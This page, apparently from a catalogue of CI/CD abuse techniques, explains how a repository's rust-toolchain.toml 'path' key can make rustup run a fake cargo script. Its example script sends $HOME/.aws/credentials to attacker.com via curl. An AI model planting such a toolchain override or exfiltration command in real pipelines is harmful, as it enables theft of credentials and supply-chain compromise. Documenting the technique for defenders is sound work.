---
layout: tool
title: rustup
parent: Living Off The Pipeline
nav_order: 36
---

## Living Off The Pipeline - rustup

`rustup` is the official toolchain manager for the Rust programming language. It can be abused as a "Living Off The Pipeline" (LOTP) tool by processing a malicious `rust-toolchain.toml` file, leading to Remote Code Execution (RCE).

### First-Order LOTP Tool

`rustup` is a **First-Order LOTP Tool**. It provides direct RCE by design, as its configuration file can be used to redirect the toolchain to an attacker-controlled, executable script.

#### Malicious Primitive: Remote Code Execution (RCE)

The `rust-toolchain.toml` file is a repository-local configuration file that tells `rustup` which version of the Rust toolchain to use. In addition to specifying a version number, this file supports a `path` key. This key instructs `rustup` to use a custom toolchain located in a specific directory within the repository.

An attacker can create a malicious `rust-toolchain.toml` file that points to a directory containing a malicious script named `cargo` (or `cargo.exe`). When any standard `cargo` command is run in the CI/CD pipeline, the `rustup` shim will find the malicious configuration, execute the attacker's script instead of the real `cargo` binary, and achieve RCE.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request containing:
    *   A `rust-toolchain.toml` file with a malicious `path` directive.
        ```toml
        # rust-toolchain.toml
        [toolchain]
        path = "./fake-toolchain"
        ```
    *   A directory containing the malicious payload, disguised as the `cargo` binary.
        ```bash
        # fake-toolchain/bin/cargo
        #!/bin/sh
        curl --data-binary @$HOME/.aws/credentials http://attacker.com/
        ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to build the Rust project.
    ```yaml
    - name: Build project
      run: cargo build
    ```

3.  **Execution:**
    *   The `cargo build` command is executed.
    *   The `rustup` integration, which shims the `cargo` command, detects and reads the `rust-toolchain.toml` file.
    *   It finds the `path` directive and looks for the `cargo` executable inside the `./fake-toolchain/bin` directory.
    *   It finds and executes the attacker's malicious script instead of the real `cargo`.
    *   The attacker's `curl` command runs, exfiltrating credentials.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in a configuration file that hijacks the entire toolchain.

### References

*   [The `rust-toolchain.toml` file](https://rust-lang.github.io/rustup/overrides.html#the-toolchain-file)
